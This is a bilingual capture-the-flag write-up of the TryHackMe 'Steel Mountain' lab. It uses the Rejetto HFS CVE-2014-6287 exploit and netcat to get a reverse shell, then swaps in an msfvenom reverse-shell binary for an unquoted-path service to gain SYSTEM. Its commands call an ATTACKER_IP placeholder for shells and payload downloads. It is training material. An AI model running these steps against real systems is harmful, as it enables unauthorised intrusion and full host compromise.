# Steel Mountain — TryHackMe Writeup

**Target:** `TARGET_IP`
**OS:** Windows Server
**Difficulty:** Easy
**Tech stack:** IIS 8.5, Rejetto HTTP File Server 2.3 (port 8080), SMB, RDP
**Exploit chain:** Rejetto HFS CVE-2014-6287 → reverse shell as `bill` → winPEAS → unquoted service path in `AdvancedSystemCareService9` → msfvenom service binary → SYSTEM

---

## Attack Chain Overview

```
nmap → 80, 135, 139, 445, 3389, 5985, 8080 + high RPC ports
    →
port 8080 → Rejetto HTTP File Server 2.3 → CVE-2014-6287
    →
searchsploit → 39161.py (HFS RCE)
    →
Stage nc.exe via HTTP → reverse shell as bill
    →
winPEAS → AdvancedSystemCareService9 unquoted path + writable dir
    →
msfvenom exe-service → replace ASCService.exe → sc stop/start → SYSTEM
    →
root.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Initial Access — Rejetto HFS RCE](#2-initial-access--rejetto-hfs-rce)
3. [Privilege Escalation — Unquoted Service Path](#3-privilege-escalation--unquoted-service-path)
4. [Key Takeaways](#4-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run a fast port scan on the target.
# Why here: identify the full attack surface, including the vulnerable HFS service on port 8080, before running deep service scripts.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent

# What it does: perform service version detection and run default scripts on all open ports.
# Why here: identify the Rejetto HTTP File Server version for exploit matching.
nmap -sVC -p80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49193,49194 $TARGET -oN service
```

ES: Vemos HTTP abierto en los puertos 80 y 8080. Inspeccionando el puerto 8080 aparece Rejetto HTTP File Server, vulnerable a CVE-2014-6287.

EN: HTTP is open on ports 80 and 8080. Port 8080 reveals Rejetto HTTP File Server, vulnerable to CVE-2014-6287.

See [nmap.md](../../tools/recon/nmap.md).

---

## 2. Initial Access — Rejetto HFS RCE

Full technique: [rejetto-hfs-rce.md](../../exploits/web-rce/rejetto-hfs-rce.md).

```bash
# What it does: search for exploits matching the detected Rejetto HFS version.
# Why here: verify the existence of a public exploit (CVE-2014-6287) for the target service.
searchsploit rejetto http

# What it does: download the chosen exploit script (39161.py) from the Exploit-DB local mirror.
# Why here: prepare the exploit for customization and execution against the target.
searchsploit windows/remote/39161.py -m
```

ES: Editar en el exploit la IP y el puerto del atacante.

EN: Edit the exploit to set the attacker's IP and port.

```python
# What it does: update the exploit script with the attacker's listener details.
# Why here: ensure the reverse shell payload connects back to the correct attacker IP and port.
ip_addr = "ATTACKER_IP"
local_port = "443"
```

ES: Copiamos `nc.exe`, servimos el binario y lanzamos el exploit.

EN: Copy `nc.exe`, serve the binary and launch the exploit.

```bash
# What it does: copy the Windows netcat binary to the temporary directory.
# Why here: prepare the binary for download by the target as part of the exploitation sequence.
cp /usr/share/windows-resources/binaries/nc.exe /tmp/

# What it does: start a temporary HTTP server on the attacker machine.
# Why here: host the nc.exe binary so the target can download it using the command injection in HFS.
sudo python3 -m http.server 80

# What it does: open a TCP listener with rlwrap for an enhanced shell experience.
# Why here: capture the incoming reverse shell from the Rejetto HFS exploit.
rlwrap nc -lvnp 443

# What it does: run the customized exploit against the target.
# Why here: trigger the RCE in HFS to download and execute netcat, providing an initial reverse shell.
/usr/bin/python2 39161.py $TARGET 8080
```

ES: Navegamos al Desktop del usuario `bill` y obtenemos la flag.

EN: Navigate to bill's Desktop to get the user flag.

---

## 3. Privilege Escalation — Unquoted Service Path

Full technique: [unquoted-service-path.md](../../exploits/privesc-windows/unquoted-service-path.md).

```cmd
REM What it does: enumerate all installed services and their binary paths.
REM Why here: identify services with binary paths outside of C:\Windows that might be vulnerable to unquoted service paths or insecure permissions.
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

ES: Generamos un binario de servicio que abre reverse shell.

EN: Generate a malicious service binary that opens a reverse shell.

```bash
# What it does: create a malicious Windows service executable using msfvenom.
# Why here: generate a payload to replace a vulnerable service binary for privilege escalation to SYSTEM.
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

ES: Transferimos el payload y reemplazamos el servicio vulnerable.

EN: Transfer the payload and replace the vulnerable service binary.

```cmd
REM What it does: download the malicious service binary to the target.
REM Why here: place the privilege escalation payload on the victim machine.
powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP/Advanced.exe -OutFile Advanced.exe"

REM What it does: stop the vulnerable AdvancedSystemCareService9 service.
REM Why here: halt the service to allow for the replacement of its executable binary.
sc stop AdvancedSystemCareService9

REM What it does: overwrite the legitimate service binary with the malicious one.
REM Why here: hijack the service execution so that it runs our reverse shell on start.
copy Advanced.exe ASCService.exe

REM What it does: restart the hijacked service.
REM Why here: trigger the execution of the reverse shell payload with SYSTEM privileges.
sc start AdvancedSystemCareService9
```

```cmd
REM What it does: identify the current user context.
REM Why here: confirm successful privilege escalation to NT AUTHORITY\SYSTEM.
whoami

REM What it does: read the root flag.
REM Why here: confirm full system compromise and complete the challenge.
type root.txt
```

---

## 4. Key Takeaways

- Rejetto HTTP File Server 2.3 is a classic CVE-2014-6287 target — version fingerprinting the HFS banner on any non-standard HTTP port is always worth trying.
- `searchsploit -m` copies the PoC locally for editing; always update `ip_addr` and `local_port` before running.
- Unquoted service paths in Windows are exploitable when you can write to an intermediate directory — `wmic service get pathname` is the discovery command.
- `msfvenom -f exe-service` generates a binary that implements the Windows service API, which is required for `sc start` to execute it.
- Always `sc stop` the target service first — you cannot overwrite a running service binary.

---

## Related Notes
- [rejetto-hfs-rce.md](../../exploits/web-rce/rejetto-hfs-rce.md) — initial access
- [unquoted-service-path.md](../../exploits/privesc-windows/unquoted-service-path.md) — privilege escalation
- [windows-enumeration.md](../../exploits/enumeration/windows-enumeration.md) — post-foothold playbook
- [nmap](../../tools/recon/nmap.md), [searchsploit](../../tools/recon/searchsploit.md), [netcat](../../tools/pivot/netcat.md), [metasploit](../../tools/exploit/metasploit.md)
